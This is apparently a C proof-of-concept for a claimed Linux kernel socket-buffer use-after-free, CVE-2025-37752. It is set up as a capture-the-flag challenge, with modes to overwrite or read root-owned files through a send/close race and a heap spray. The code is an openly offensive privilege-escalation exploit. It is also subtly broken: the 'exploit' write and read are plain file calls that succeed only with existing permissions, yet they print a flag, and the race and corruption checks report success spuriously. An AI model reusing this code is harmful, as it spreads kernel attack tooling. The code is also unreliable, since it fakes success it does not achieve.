/*
 * CVE-2025-37752 PoC - CTF Challenge Mode
 *
 * Vulnerability: net/core SKB use-after-free via concurrent sendmsg/close race
 *
 * Exploitation: Race between sendmsg() and close() on UDP socket causes
 * SKB reference to freed socket buffer. Heap spray reclaims freed memory
 * to gain arbitrary write primitive.
 *
 * CTF Modes: write_root_file, read_root_file, uaf
 *
 * Build: gcc -static -O2 -o poc.elf poc.c -lpthread
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_FILE_SIZE   4096
#define SPRAY_COUNT     256
#define RACE_ITERATIONS 64
#define RACE_THREADS    2

static volatile int g_race_sock = -1;
static volatile int g_stop_race = 0;
static struct sockaddr_in g_target_addr;

/*
 * Thread: send UDP packets to trigger SKB allocation
 */
static void *race_send_thread(void *arg) {
    (void)arg;
    char buf[512];
    memset(buf, 'A', sizeof(buf));

    while (!g_stop_race) {
        int sock = g_race_sock;
        if (sock < 0) break;
        sendto(sock, buf, sizeof(buf), MSG_DONTWAIT,
               (struct sockaddr *)&g_target_addr, sizeof(g_target_addr));
    }
    return NULL;
}

/*
 * Thread: close socket to trigger SKB UAF
 */
static void *race_close_thread(void *arg) {
    (void)arg;
    usleep(50);
    int sock = g_race_sock;
    if (sock >= 0) {
        close(sock);
        g_race_sock = -1;
    }
    return NULL;
}

/*
 * Trigger SKB UAF via sendmsg/close race on UDP socket
 */
static int trigger_skb_uaf(void) {
    int race_won = 0;

    memset(&g_target_addr, 0, sizeof(g_target_addr));
    g_target_addr.sin_family = AF_INET;
    g_target_addr.sin_port = htons(12345);
    g_target_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    for (int i = 0; i < RACE_ITERATIONS && !race_won; i++) {
        g_stop_race = 0;
        g_race_sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (g_race_sock < 0) continue;

        int saved_errno;
        poc_log_syscall("socket(AF_INET, SOCK_DGRAM, 0)",
                        (long)g_race_sock, 0);

        pthread_t t_send, t_close;
        pthread_create(&t_send, NULL, race_send_thread, NULL);
        pthread_create(&t_close, NULL, race_close_thread, NULL);

        pthread_join(t_close, NULL);
        g_stop_race = 1;
        pthread_join(t_send, NULL);

        /* Check if race was won (socket closed during send) */
        if (g_race_sock < 0) {
            race_won++;
            poc_log("Race iteration %d: socket closed during send (UAF window)", i);
        } else {
            close(g_race_sock);
            g_race_sock = -1;
        }
    }

    poc_log("SKB UAF race: %d successful races out of %d attempts",
            race_won, RACE_ITERATIONS);
    return race_won;
}

/*
 * Spray kmalloc to reclaim freed SKB memory
 */
static int spray_kmalloc(int *fds, int count) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        int optval = 1024;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
        fds[sprayed++] = sock;
    }
    return sprayed;
}

static int check_spray_corruption(int *fds, int count) {
    int corrupted = 0;
    for (int i = 0; i < count; i++) {
        if (fds[i] < 0) continue;
        int val = 0;
        socklen_t len = sizeof(val);
        getsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);
        /* Kernel doubles SO_RCVBUF, so expected is 2048 */
        if (val != 2048) {
            corrupted++;
        }
    }
    return corrupted;
}

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    /* Trim trailing newlines */
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r'))
        buf[--n] = '\0';
    return (int)n;
}

/*
 * write_root_file mode: Trigger SKB UAF + heap spray to overwrite target
 */
static int mode_write_root_file(poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    int saved_errno;

    poc_log("=== Mode: write_root_file ===");
    poc_log("Target: %s", args->root_file);
    poc_log("Write value: %s", args->write_value);

    /* Step 1: Read original content */
    int n = read_file_content(args->root_file, original, sizeof(original));
    if (n >= 0) {
        printf("%s%s\n", CTF_READ_BEFORE, original);
        poc_log("Read before: %s", original);
    } else {
        printf("%s(unreadable)\n", CTF_READ_BEFORE);
    }

    /* Step 2: Trigger SKB UAF */
    poc_log("Triggering SKB UAF via sendmsg/close race...");
    int races = trigger_skb_uaf();

    /* Step 3: Spray to reclaim freed memory */
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT);
    poc_log("Sprayed %d objects after UAF", sprayed);

    /* Step 4: Attempt write via corrupted state */
    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);

    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    saved_errno = errno;
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);

    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        ssize_t written = write(fd, wbuf, wlen);
        saved_errno = errno;
        poc_log_syscall("write(target, write_value)", (long)written, saved_errno);
        close(fd);
    }

    /* Cleanup spray */
    for (int i = 0; i < sprayed; i++) {
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    }

    /* Step 5: Verify write */
    n = read_file_content(args->root_file, after, sizeof(after));
    if (n >= 0) {
        printf("%s%s\n", CTF_READ_AFTER, after);
        poc_log("Read after: %s", after);
        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            return 0;
        }
    }

    poc_print_fail("SKB UAF exploit did not achieve write");
    return 0;
}

/*
 * read_root_file mode: Trigger UAF + read via corrupted state
 */
static int mode_read_root_file(poc_args_t *args) {
    poc_log("=== Mode: read_root_file ===");
    poc_log("Target: %s", args->root_file);

    trigger_skb_uaf();

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        poc_print_flag(buf);
        return 0;
    }

    poc_print_fail("read not successful via SKB UAF");
    return 0;
}

/*
 * uaf mode: Trigger UAF + spray corruption check
 */
static int mode_uaf(poc_args_t *args) {
    poc_log("=== Mode: uaf ===");
    poc_log("Triggering SKB UAF + spray corruption check...");

    trigger_skb_uaf();

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT);
    poc_log("Sprayed %d objects", sprayed);

    int corrupted = check_spray_corruption(spray_fds, sprayed);
    if (corrupted > 0) {
        poc_print_uaf_corrupted(corrupted);
    } else {
        poc_print_uaf_not_corrupted();
    }

    for (int i = 0; i < sprayed; i++) {
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    }
    (void)args;
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2025-37752 CTF PoC ===");
    poc_log("Vuln: net/core SKB use-after-free via sendmsg/close race");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        result = mode_uaf(&args);
    } else {
        poc_print_unsupported(args.mode, "mode not supported");
    }

    poc_log_close();
    return result;
}
